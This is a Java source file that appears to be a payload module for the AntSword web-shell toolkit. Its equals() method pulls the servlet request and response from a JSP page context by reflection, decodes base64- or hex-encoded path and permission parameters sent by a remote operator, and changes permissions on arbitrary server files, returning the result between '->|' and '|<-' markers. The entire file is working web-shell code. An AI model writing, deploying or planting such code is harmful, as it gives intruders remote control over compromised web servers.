import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.attribute.PosixFilePermission;
import java.util.HashSet;
import java.util.Set;

public class Chmod {
    public HttpServletRequest request = null;
    public HttpServletResponse response = null;
    public String encoder;
    public String cs;
    public String randomPrefix;

    @Override
    public boolean equals(Object obj) {
        try {
            Class clazz = Class.forName("javax.servlet.jsp.PageContext");
            request = (HttpServletRequest) clazz.getDeclaredMethod("getRequest").invoke(obj);
            response = (HttpServletResponse) clazz.getDeclaredMethod("getResponse").invoke(obj);
        } catch (Exception ex) {
            if (obj instanceof HttpServletRequest) {
                request = (HttpServletRequest) obj;
                try {
                    Field req = request.getClass().getDeclaredField("request");
                    req.setAccessible(true);
                    HttpServletRequest request2 = (HttpServletRequest) req.get(request);
                    Field resp = request2.getClass().getDeclaredField("response");
                    resp.setAccessible(true);
                    response = (HttpServletResponse) resp.get(request2);
                } catch (Exception e) {
                    e.printStackTrace();
                }

            } else if (obj instanceof HttpServletResponse) {
                response = (HttpServletResponse) obj;
                try {
                    Field resp = response.getClass().getDeclaredField("response");
                    resp.setAccessible(true);
                    HttpServletResponse response2 = (HttpServletResponse) resp.get(response);
                    Field req = response2.getClass().getDeclaredField("request");
                    req.setAccessible(true);
                    request = (HttpServletRequest) req.get(response2);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
        randomPrefix = "antswordrandomPrefix";
        encoder = "base64";
        cs = "antswordCharset";
        StringBuffer output = new StringBuffer("");
        StringBuffer sb = new StringBuffer("");
        String tag_s = "->|";
        String tag_e = "|<-";
        String varkey1 = "antswordargpath";
        String varkey2 = "antswordargmode";
        try {
            response.setContentType("text/html");
            request.setCharacterEncoding(cs);
            response.setCharacterEncoding(cs);
            String z1 = EC(decode(request.getParameter(varkey1) + ""));
            String z2 = EC(decode(request.getParameter(varkey2) + ""));
            output.append(tag_s);
            sb.append(ChmodCode(z1, z2));
            output.append(sb.toString());
            output.append(tag_e);
            response.getWriter().print(output.toString());
        } catch (Exception e) {
            sb.append("ERROR" + ":// " + e.toString());
        }
        return true;
    }

    String EC(String s) throws Exception {
        if (encoder.equals("hex")) return s;
        return new String(s.getBytes(), cs);
    }

    String decode(String str) throws Exception {
        int prefixlen = 0;
        try {
            prefixlen = Integer.parseInt(randomPrefix);
            str = str.substring(prefixlen);
        } catch (Exception e) {
            prefixlen = 0;
        }
        if (encoder.equals("hex")) {
            if (str == null || str.equals("")) {
                return "";
            }
            String hexString = "0123456789ABCDEF";
            str = str.toUpperCase();
            ByteArrayOutputStream baos = new ByteArrayOutputStream(str.length() / 2);
            String ss = "";
            for (int i = 0; i < str.length(); i += 2) {
                ss = ss + (hexString.indexOf(str.charAt(i)) << 4 | hexString.indexOf(str.charAt(i + 1))) + ",";
                baos.write((hexString.indexOf(str.charAt(i)) << 4 | hexString.indexOf(str.charAt(i + 1))));
            }
            return baos.toString("UTF-8");
        } else if (encoder.equals("base64")) {
            byte[] bt = null;
            String version = System.getProperty("java.version");
            if (version.compareTo("1.9") >= 0) {
                Class Base64 = Class.forName("java.util.Base64");
                Object Decoder = Base64.getMethod("getDecoder", new Class[0]).invoke(Base64, new Object[]{});
                bt = (byte[]) Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, str);
            } else {
                Class Base64 = Class.forName("sun.misc.BASE64Decoder");
                Object Decoder = Base64.getDeclaredConstructor().newInstance();
                bt = (byte[]) Decoder.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder, str);
            }

            return new String(bt, "UTF-8");
        }
        return str;
    }

    Set<PosixFilePermission> getPosixFilePermission(int permissions) {
        Set<PosixFilePermission> filePermissions = new HashSet<PosixFilePermission>();
        // using bitwise operations check the file permissions in decimal
        // numeric system
        // e.g. 100100 AND 100, we will have for result 100
        if ((permissions & 256) > 0) {
            filePermissions.add(PosixFilePermission.OWNER_READ);
        }
        if ((permissions & 128) > 0) {
            filePermissions.add(PosixFilePermission.OWNER_WRITE);
        }
        if ((permissions & 64) > 0) {
            filePermissions.add(PosixFilePermission.OWNER_EXECUTE);
        }
        if ((permissions & 32) > 0) {
            filePermissions.add(PosixFilePermission.GROUP_READ);
        }
        if ((permissions & 16) > 0) {
            filePermissions.add(PosixFilePermission.GROUP_WRITE);
        }
        if ((permissions & 8) > 0) {
            filePermissions.add(PosixFilePermission.GROUP_EXECUTE);
        }
        if ((permissions & 4) > 0) {
            filePermissions.add(PosixFilePermission.OTHERS_READ);
        }
        if ((permissions & 2) > 0) {
            filePermissions.add(PosixFilePermission.OTHERS_WRITE);
        }
        if ((permissions & 1) > 0) {
            filePermissions.add(PosixFilePermission.OTHERS_EXECUTE);
        }
        return filePermissions;
    }

    String ChmodCode(String path, String permstr) {
        try {
            File f = new File(path);
            Set<PosixFilePermission> perms = getPosixFilePermission(Integer.parseInt(permstr, 8));
            Files.setPosixFilePermissions(f.toPath(), perms);
        } catch (Exception e) {
            return "0";
        }
        return "1";
    }

}
